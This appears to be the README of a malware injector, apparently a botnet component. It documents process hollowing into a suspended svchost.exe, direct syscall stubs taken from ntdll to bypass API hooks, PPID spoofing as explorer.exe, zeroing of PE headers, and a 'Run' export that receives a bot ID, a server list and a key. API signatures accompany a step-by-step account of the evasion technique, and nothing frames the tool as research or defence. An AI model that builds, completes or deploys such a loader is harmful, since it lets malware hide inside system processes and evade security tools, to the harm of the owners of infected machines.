# Injector

Windows PE Injector x86/x64, MSVC 19+, C++17  
Injector - sources of the injector

## Description
- DLL injection via manual map + search and call of the exported function Run
- EXE - manual mapping of EXE sections into svchost.exe, editing PEB.ProcessParameters, execution of EntryPoint

### General execution stack
1. InitSyscalls scans the .text section in ntdll, finds the pattern mov r10, rcx; mov eax, <id>; syscall; ret and copies it to RWX buffer, after which all Nt calls go through this stub. If the required template is not found, a manual syscall stub is built.
2. PPID spoofing is created, the parent process of the new thread becomes explorer.exe
3. A new svchost.exe process is created in SUSPENDED state with the CREATE_SUSPENDED flag
4. Remote memory is allocated, each written page is set to RX. Base address is shifted by a random value from 0x1000 to 0x1FFF.
5. PE headers and import/relocation directories are zeroed out, then BASE_RELOC blocks are corrected, IAT pages are made RW, function addresses are written, and permissions are restored.
6. TLS callbacks are enumerated and for each a thread is created, after which the instruction cache is flushed.
7. A trampoline is allocated and written in the process, which loads arguments into registers RCX, RDX, R8, R9 and calls the Run export for DLL or the EntryPoint for EXE
8. ResumeThread resumes the suspended main thread, and control is transferred to the loaded code inside svchost.exe

## API

### RunModule
```
DWORD RunModule(
    LPBYTE      module,         // PE image of the DLL in memory
    DWORD       module_size,    // size
    LPCWSTR     bot_id,         // bot ID
    LPVOID      arg,            // arguments
    DWORD       arg_size,       // argument length
    std::string& error_str,     // error text
    LPDWORD     process_id      // PID of the created process
);
```
Returns 0 on success, otherwise error code.
Inside it searches the DLL exports for the function and launches it:
```
  VOID WINAPI Run(
    LPCWSTR bot_id,
    LPCWSTR server_list,
    LPBYTE  key
  );
```
### RunExe
```
DWORD RunExe(
    LPBYTE      payload,        // PE image of the EXE in memory
    DWORD       payload_size,   // size
    LPCWSTR     cmdline,        // command line for svchost.exe
    std::string& error_str      // error text if rc not equal to 0
);
```
Returns 0 on success, otherwise error code.
Creates svchost.exe, manually maps sections, builds RTL_USER_PROCESS_PARAMETERS, patches PEB.ProcessParameters, launches EntryPoint.
